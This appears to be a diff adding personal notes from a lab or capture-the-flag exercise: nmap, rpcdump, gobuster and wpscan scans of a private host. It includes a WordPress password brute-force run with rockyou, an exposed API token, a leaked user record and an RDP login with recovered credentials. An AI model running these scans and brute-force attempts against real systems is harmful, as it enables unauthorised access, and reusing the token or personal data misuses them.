@@ -1,0 +1,26 @@
+nmap -sV -sC -Pn 192.168.41.86 > nmap.txt
+nmap -p25 --script smtp-commands 192.168.41.86 > nmapsmtpcommand.txt
+
+rpcdump.py -p 135  192.168.41.86
+nmap -p- -Pn -T5  192.168.41.86 > nmapall.txt
+
+mysql -u root -p -e 'show databases;'
+
+nmap --script vuln -sV -p 25,79,80,105,106,110,135,139,143,445,2224,3306,3389,5040,7080,7680,9000,1030,1444,2102,4966,4966,4966,4966,4967, -Pn  192.168.41.86  > nmapvuln.txt
+
+
+gobuster dir -u http://192.168.41.86/ -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+gobuster dir -u http://192.168.41.86/cgi-bin/  -w /usr/share/dirb/wordlists/vulns/cgis.txt  > cgi.txt
+gobuster dir -u http://192.168.41.86:7080/  -w /usr/share/dirb/wordlists/common.txt   > gobusterhttp7080.txt
+gobuster dir -u http://192.168.41.86:9000/  -w /usr/share/dirb/wordlists/common.txt   > gobusterhttp9000.txt
+
+
+wpscan --url http://192.168.41.86/wordpress --disable-tls-checks --enumerate u --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+wpscan --url http://192.168.41.86/wordpress --usernames user --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+wpscan --url http://internal.thm/blog/ --disable-tls-checks --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+
+
+嘗試rdp連不上
+(4, 'Juan Dela Cruz', 'juan', '902 Kagitingan St., Road 10, Tondo, Manila', 'juandelacruz@gmail.com', '89819313', 'Line 1 - Lanao Del Norte', '2018-11-11 07:34:05');
+rdesktop -a 16 -z -u juandelacruz -p 'juan' 192.168.41.86
+
